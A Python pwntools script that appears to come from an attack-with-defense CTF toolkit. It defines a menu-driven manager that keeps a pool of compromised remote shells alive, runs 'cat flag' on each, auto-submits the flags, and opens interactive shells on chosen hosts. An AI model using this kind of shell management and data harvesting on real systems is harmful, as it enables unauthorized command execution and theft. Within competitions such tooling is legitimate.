# -*- coding:utf-8 -*-

import threading
import os
import datetime
from pwn import *

class PostPWN(threading.Thread):
    """
    post pwn when you getshell in awd, 
    when the challenge does not have `alarm` or `timeout`

    Usage: 
    def submit(flag):
        ...
    PostPWN([remote_object,], submit)
    """
    def __init__(self, shells,submit_function=None):
        """shell: the remote shells from pwntools"""
        # args: [remote1, remote2, ...]
        threading.Thread.__init__(self)
        self.shells=shells
        if submit_function:
            self.submit_function=submit_function
        else:
            self.submit_function=self.empty_func_error
        self.start()
        self.main()

    def main(self):
        # a menu to do sth
        while True:
            print("\033[37mWelcome to PostPWN")
            print("[1] auto submit flag")
            print("[2] submit flag")
            print("[3] get interactive shell")
            print("[4] info active ip")
            choice=0
            while True:
                try:
                    choice=raw_input("\033[33mMain> \033[37m")
                    choice=int(choice)
                    break
                except KeyboardInterrupt as e:
                    print("\033[36mBye~")
                    os._exit(0)
                except:
                    continue
            if choice==1:
                # can box the submit as class
                interval=0
                try:
                    interval=int(raw_input("\033[33mInterval> \033[37m"))
                    while True:
                        try:
                            self.submit_flag()
                        except KeyboardInterrupt:
                            break
                        except Exception as e:
                            print(e)
                            break
                        print("\033[32m[%s] submit_flag Done!"%(datetime.datetime.now().strftime('%T')))
                        sleep(interval)
                except KeyboardInterrupt:
                    continue
                
            elif choice == 2:
                try:
                    self.submit_flag()
                    print("\033[32m[%s] submit_flag Done!"%(datetime.datetime.now().strftime('%T')))    
                except Exception as e:
                    print(e)
                    continue
            elif choice==3:
                self.interactive_shell()
            elif choice == 4:
                print("\033[37mActive ip: ")
                for i in [shell.rhost for shell in self.shells]:
                    print("[*] \033[32m%s"%i)
                print("\033[37m[\033[32m+\033[37m] have %d shells in all\n"%len(self.shells))

    def deamon(self):
        print("\033[37mActive ip: \033[32m%s \033[37m"%str([shell.rhost for shell in self.shells]))
        for shell in self.shells:
            shell.sendline("echo isActive")
            # shell.sendline("bin_name")
            shell.sendline("/bin/sh")
            if "isActive" in shell.recv(1024):
                continue
            else:
                self.shells.remove(shell)
                info("IP: \033[31m%s:%d \033[38mis not active"%(shell.rhost,shell.rport))
        sleep(20)

    def get_flag(self):
        flags=[]
        for shell in self.shells:
            shell.sendline("echo getflag")
            shell.recvuntil("getflag\n")
            shell.sendline("cat flag")
            flags.append(shell.recvline()[:-1])
            shell.recv(1024)
        return flags

    def empty_func_error(self,pad):
        # check error
        print("\033[32m[*] submit: %s\033[37m"%pad)
        error("plz give me a function like `submit(flag)` to submit_flag!")


    def submit_flag(self):
        # func: a function like submit(flag)
        flags=self.get_flag()
        print("\n\033[37m-------------Bullet: -----------")
        for i in flags:
            print(i)
        print("--------------------------------\n")
        for i in flags:
            self.submit_function(i)
        # print("\033[32m[+] submit_flag has done!")

    def interactive_shell(self):
        print("Choose one to get interactive_shell: ")
        for i in range(len(self.shells)):
            print("[%d] %s:%d"%(i,self.shells[i].rhost,self.shells[i].rport))
        tmp_shell=None
        try:
            pyin=raw_input("\033[33mChoice> \033[37m")
            tmp_shell=self.shells[int(pyin)]
            tmp_shell.interactive()
        except KeyboardInterrupt as e:
            print("\033[31m[-] KeyboardInterrupt!\033[38m")
            return
        except:
            print("\033[31m[-] Some error!\033[38m")
        finally:
            # to fix a bug
            if tmp_shell not in self.shells and tmp_shell:
                self.shells.append(tmp_shell)

    def run(self):
        # deamon_wrappe
        while True:
            self.deamon()